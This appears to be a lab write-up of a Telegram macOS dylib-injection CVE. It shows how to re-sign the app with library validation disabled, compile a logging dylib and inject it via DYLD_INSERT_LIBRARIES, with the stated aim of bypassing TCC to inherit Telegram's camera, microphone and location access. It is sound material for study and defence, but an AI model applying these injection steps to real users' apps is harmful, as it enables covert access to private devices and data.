&lt;h2 id=&quot;dylibinjection&quot;&gt;&lt;strong&gt;DyLib/Injection&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt; is a short for (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dynamic Library&lt;/code&gt;) which is a library that is loaded at the runtime &amp;amp; launch time of the software, Unless&lt;/p&gt;

&lt;p&gt;Static Libraries, Which are linked to the software as a part of the code during the compilation, and As a result the software size&lt;/p&gt;

&lt;p&gt;becomes large &amp;amp; slower in launching time &amp;amp; performance. Because, When the software gets launched with the included static&lt;/p&gt;

&lt;p&gt;libraries as a part of the code all get loaded in the same memory space as a one piece. Therefore, It suffers from slow&lt;/p&gt;

&lt;p&gt;launch times and large memory footprints. For the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt;, It improves the performance and flexibility by not becoming a part&lt;/p&gt;

&lt;p&gt;of the code &amp;amp; It gets loaded when it’s required or during the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runtime&lt;/code&gt; launching time. As a result, a small size and small&lt;/p&gt;

&lt;p&gt;memory footprints for the software. The following diagrams show the difference between Static Libraries and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Static Libraries:&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/993003e029fd224299423f268be73940&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Dynamic Libraries:&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/d8b675ef9a787d0b6a52d3ec0f802f8a&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;testing-lab&quot;&gt;&lt;strong&gt;Testing Lab&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;For Our Lab&lt;strong&gt;,&lt;/strong&gt; we need &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt; any supported version by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Telegram&lt;/code&gt; and for the vulnerable versions according to&lt;/p&gt;

&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE&lt;/code&gt; description is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;9.3.1&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;9.4.0&lt;/code&gt;. But, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Telegram&lt;/code&gt; team deleted those versions. So we gonna download this&lt;/p&gt;

&lt;p&gt;one &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;9.3.2&lt;/code&gt; from &lt;a href=&quot;https://osx.telegram.org/updates/Telegram-9.3.241534.app.zip&quot;&gt;here&lt;/a&gt; and we will do some modifications to make it vulnerable again. After Downloading it, Move it to&lt;/p&gt;

&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Applications&lt;/code&gt; Directory. Now, We will remove the signing from telegram and re-sign it with our signature and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let’s first take a look on the signing information and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt; related to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Telegram&lt;/code&gt; app:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;codesign -dv --entitlements :- /Applications/Telegram.app
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/44c5e35545533e68443c8007a2b152d0&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To remove telegram signing we need to execute the following command to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Telegram&lt;/code&gt; App:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;codesign --remove-signature --no-strict /Applications/Telegram.app
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, The command is run successfully, and if we check the signing with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;codesign&lt;/code&gt; command. We can see it has no signing:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;codesign -dv --etitlements :- /Applications/Telegram.app
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/a6e6a5e6b7939329fc79a449f819dc8f&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s sign &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Telegram&lt;/code&gt; App now with our own signature and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt;, First, we need to get our own signature, You can get it&lt;/p&gt;

&lt;p&gt;by doing the following… First, Download &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Xcode&lt;/code&gt; from AppStore on your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/ec28edede23a9dd0692d63d17b2f7fec&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After that open &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Xcode&lt;/code&gt; and create a new project then go to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Xcode&lt;/code&gt; in the menu and then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Settings&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/7b53610bb20fec90d746738f50e9b07c&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then go to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accounts&lt;/code&gt; and click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+&lt;/code&gt; and add your Apple ID:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5f78799aca67f0b87c06b4cf19355900&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After adding your Apple ID, Click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Manage Certificates&lt;/code&gt; and click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+&lt;/code&gt; and add a new signing certificate:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/72cc9ef1ea7073bad8fdad881f5c0406&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After finishing we need to build the test app to get our signature So, we need to configure the signing. Click on our project&lt;/p&gt;

&lt;p&gt;on the left side, The go to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Signing &amp;amp; Capabilities&lt;/code&gt; tab and choose your ID:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/26c543827c39fa92847924c63848d80e&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, Click on the play button to build and run the app:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/771df34f3f275bc8fa3f31d4fdae6a9c&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, It’s time top get our signature by executing the following command:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;security find-identity -v -p codesigning
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cd385b43d9d6279e0813fad1d7da3783&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I had created 2 before so you can see them clearly, Now it’s time to create our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt; that we gonna sign with telegram:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
&amp;lt;plist version=&quot;1.0&quot;&amp;gt;
&amp;lt;dict&amp;gt;
    &amp;lt;key&amp;gt;com.apple.security.app-sandbox&amp;lt;/key&amp;gt;
    &amp;lt;false/&amp;gt;
    &amp;lt;key&amp;gt;com.apple.security.application-groups&amp;lt;/key&amp;gt;
    &amp;lt;array&amp;gt;
        &amp;lt;string&amp;gt;6N38VWS5BX.ru.keepcoder.Telegram&amp;lt;/string&amp;gt;
        &amp;lt;string&amp;gt;6N38VWS5BX.ru.keepcoder.Telegram.TelegramShare&amp;lt;/string&amp;gt;
    &amp;lt;/array&amp;gt;
    &amp;lt;key&amp;gt;com.apple.security.cs.allow-dyld-environment-variables&amp;lt;/key&amp;gt;
    &amp;lt;true/&amp;gt;
    &amp;lt;key&amp;gt;com.apple.security.cs.disable-library-validation&amp;lt;/key&amp;gt;
    &amp;lt;true/&amp;gt;
    &amp;lt;key&amp;gt;com.apple.security.device.audio-input&amp;lt;/key&amp;gt;
    &amp;lt;true/&amp;gt;
    &amp;lt;key&amp;gt;com.apple.security.device.camera&amp;lt;/key&amp;gt;
    &amp;lt;true/&amp;gt;
    &amp;lt;key&amp;gt;com.apple.security.personal-information.location&amp;lt;/key&amp;gt;
    &amp;lt;true/&amp;gt;
&amp;lt;/dict&amp;gt;
&amp;lt;/plist&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now save all these &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt; into a file let’s name it &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;entit.plist&lt;/code&gt;. It’s time to take your valid development signature and&lt;/p&gt;

&lt;p&gt;let’s start signing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Telegram&lt;/code&gt; App:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;codesign --force --deep --sign &quot;Developer ID&quot; --entitlements entit.plist /Applications/Telegram.app
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/461faabe008a5dc6c1e13e6e98c2772f&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, We have the app signed by us and it’s ready for analysis.&lt;/p&gt;

&lt;h1 id=&quot;the-analysis&quot;&gt;&lt;strong&gt;The Analysis&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Let’s start our analysis by taking a look at the signing information we did which simulate&lt;strong&gt;s&lt;/strong&gt; the actual one for the version&lt;/p&gt;

&lt;p&gt;that got deleted by the team.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;codesign -dv --entitlements :- /Applications/Telegram.app
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/646e560cb599503f78184afdcb2ee4f9&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This command is to show the signing info of the app, Along with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-dv&lt;/code&gt; is to display information about code&lt;/p&gt;

&lt;p&gt;signing and verbosing. for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--entitlements :-&lt;/code&gt; is to display the app &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt;. When we take a closer look we can see the&lt;/p&gt;

&lt;p&gt;highlighted places which are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flags=0x0(none)&lt;/code&gt; the following:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;key&amp;gt;com.apple.security.cs.disable-library-validation&amp;lt;/key&amp;gt;&amp;lt;true/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, What is this key, and what it’s doing? the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.apple.security.cs.disable-library-validation&lt;/code&gt; is one of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt; that&lt;/p&gt;

&lt;p&gt;controls whether library validation is enabled or disabled for the application, Which is a security feature in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt; that&lt;/p&gt;

&lt;p&gt;checks and validates the code signature of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt; loaded by an application. As a result, It avoids loading a non-&lt;/p&gt;

&lt;p&gt;signed/verified &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt; which could be maliciouis. Here we can see that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt; validation is turned off. Then, We can load&lt;/p&gt;

&lt;p&gt;a malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt; Into the app. Now, How that could happen? Well, there are many ways that the apps normally used in&lt;/p&gt;

&lt;p&gt;loading &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt; as the following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Dyld Environment Variable:&lt;/strong&gt; An application can specify a list of directories in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DYLD_INSERT_LIBRARIES&lt;/code&gt; environment&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;variable where the dynamic linker (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dyld&lt;/code&gt;) should search for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLibs&lt;/code&gt;. If this variable is set, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dyld&lt;/code&gt; will look in these&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;directories when resolving library dependencies.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;RPATH:&lt;/strong&gt; An application can specify a runtime search path (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RPATH&lt;/code&gt;) inside the binary, which tells &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dyld&lt;/code&gt; where to search&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLibs&lt;/code&gt;. This path is encoded in the executable file and is used during runtime to locate required libraries.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Frameworks:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt; applications can use frameworks, which are bundles of shared libraries, headers, and other resources. Frameworks are a convenient way to package and load libraries, and they are commonly used by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt; app developers.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Bundles and Plug-ins:&lt;/strong&gt; An application can load &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLibs&lt;/code&gt; from separate bundles or plug-ins that are loaded at runtime. Bundles and plug-ins are essentially separate packages containing code and resources that the application can load as needed.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Mach-O Dynamic Linker API:&lt;/strong&gt; An application can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mach-O&lt;/code&gt; dynamic linker API to explicitly load and link dylibs at&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;runtime. This allows the application to control the loading and unloading of libraries programmatically.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;NSAddImage():&lt;/strong&gt; On &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Objective-C&lt;/code&gt; applications can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NSAddImage()&lt;/code&gt; function to dynamically load a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLibs&lt;/code&gt; at&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;runtime. This function allows the application to load a library and use the symbols defined in it.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;dlopen() and dlsym():&lt;/strong&gt; Applications can use the standard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C&lt;/code&gt; library functions &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dlopen()&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dlsym()&lt;/code&gt; to load and access symbols from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLibs&lt;/code&gt; at runtime. These functions are commonly used in dynamic loading scenarios.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Is it only vulnerable when it has this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlement&lt;/code&gt; ? No, and There are other cases as the following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;When the app is not defined as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hardened Runtime&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;When the app has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.apple.security.cs.disable-library-validation&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;When the app has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.apple.security.cs.allow-dyld-environment-variables&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Our main focus now is to exploit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt; Injection through &lt;strong&gt;Dyld Environment Variable&lt;/strong&gt;, We can do this easily by setting&lt;/p&gt;

&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DYLD_INSERT_LIBRARIES&lt;/code&gt; environment variable. To inject our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt; we need to write our own malicious one to use and this&lt;/p&gt;

&lt;p&gt;can be done using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Objective-C&lt;/code&gt;, Which is primarily used in development for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OSX&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOS&lt;/code&gt;. In other words, Apple products.&lt;/p&gt;

&lt;p&gt;back in the time, It was developed by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NeXT&lt;/code&gt; for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NeXTSTEP OS&lt;/code&gt; before Apple takes it. the language is a superset&lt;/p&gt;

&lt;p&gt;of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C&lt;/code&gt; language. We won’t cover the basics of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Objective-C&lt;/code&gt;, But, We will be explaining the code parts:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#import &amp;lt;Foundation/Foundation.h&amp;gt;

__attribute__((constructor))
static void telegram(int argc, const char **argv) {
NSLog(@&quot;[+] Dynamic library loaded into %s&quot;, argv[0]);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;First, We Imported the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Foundation&lt;/code&gt; framework which provides fundamental classes and functionality similar to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdio.h&lt;/code&gt; library&lt;/p&gt;

&lt;p&gt;in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C&lt;/code&gt; language. Then, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__attribute__((constructor))&lt;/code&gt; which is a compiler attribute, When applied to a function, It indicates that&lt;/p&gt;

&lt;p&gt;the function should be executed automatically when the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt; is loaded. After that, we declared a static function&lt;/p&gt;

&lt;p&gt;named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telegram&lt;/code&gt; Inside it, we can see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NSLog(@&quot;[+] Dynamic library loaded into %s&quot;, argv[0]);&lt;/code&gt; which prints a massage followed by&lt;/p&gt;

&lt;p&gt;the value of the first element of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv&lt;/code&gt; array which represents the path to the executable of the app that loaded&lt;/p&gt;

&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt;. Now, Let’s save our code in a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;teleDyLib.m&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8f02fbee8d1acc3f26c9782b0f7296b5&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After that, we will be compiling our code using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc&lt;/code&gt; normally using the following:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -framework Foundation -dynamiclib teleDyLib.m -o tele.dylib
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we specified the framework we wanna use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-framework&lt;/code&gt; argument, Along with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-dynamiclib&lt;/code&gt; argument to compile our code as&lt;/p&gt;

&lt;p&gt;a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/63d0274573031cbe9ae6d7e0effce913&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we see our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt; ready. Now, Let’s perform our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt; Injection to test it:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DYLD_INSERT_LIBRARIES=tele.dylib /Applications/Telegram.app/Contents/MacOS/Telegram
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cab9b5ee9776c924e47af9beab531df8&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we can see in the screenshot the highlighted spot, Where the output shows that the library Injected and loaded&lt;/p&gt;

&lt;p&gt;successfully. Let’s Take a look at it dynamically while &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Telegram&lt;/code&gt; loading our library using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opensnoop&lt;/code&gt; tool.&lt;/p&gt;

&lt;p&gt;Basically, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opensnoop&lt;/code&gt; tracks file opens. As a process issues a file open, details such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UID&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PID&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pathname&lt;/code&gt; are printed&lt;/p&gt;

&lt;p&gt;out.:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo opensnoop -n Telegram -a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we defined the process to trace by name using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-n&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a&lt;/code&gt; is used to print all data.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/0532cea56e02d3436f20a1099d9c5d79&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we can see clearly the loaded files by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Telegram&lt;/code&gt; app which includes our library (Highlighted in the screenshot) including&lt;/p&gt;

&lt;p&gt;library path and other information as the following:&lt;/p&gt;

&lt;p&gt;- &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZONE&lt;/code&gt;: Zone name.&lt;/p&gt;

&lt;p&gt;- &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UID&lt;/code&gt;: User ID.&lt;/p&gt;

&lt;p&gt;- &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PID&lt;/code&gt;: Process ID.&lt;/p&gt;

&lt;p&gt;- &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PPID&lt;/code&gt;: Parent Process ID.&lt;/p&gt;

&lt;p&gt;- &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FD&lt;/code&gt;: File Descriptor (-1 is error).&lt;/p&gt;

&lt;p&gt;- &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ERR&lt;/code&gt;: errno value (see /usr/include/sys/errno.h).&lt;/p&gt;

&lt;p&gt;- &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CWD&lt;/code&gt;: current working directory of the process.&lt;/p&gt;

&lt;p&gt;- &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH&lt;/code&gt;: pathname for file open.&lt;/p&gt;

&lt;p&gt;- &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;COMM&lt;/code&gt;: command name for the process.&lt;/p&gt;

&lt;p&gt;- &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ARGS&lt;/code&gt;: argument listing for the process.&lt;/p&gt;

&lt;p&gt;- &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TIME&lt;/code&gt;: timestamp for the open event, us.&lt;/p&gt;

&lt;p&gt;- &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STRTIME&lt;/code&gt;: timestamp for the open event, string.&lt;/p&gt;

&lt;p&gt;Now, How that could be exploited or what impact could that cause? Basically, We are going to bypass &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCC&lt;/code&gt; and get access to the&lt;/p&gt;

&lt;p&gt;same &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt; as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Telegram&lt;/code&gt; app, Since our code is loaded within the app then we will act based on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Telegram&lt;/code&gt; permissions&lt;/p&gt;

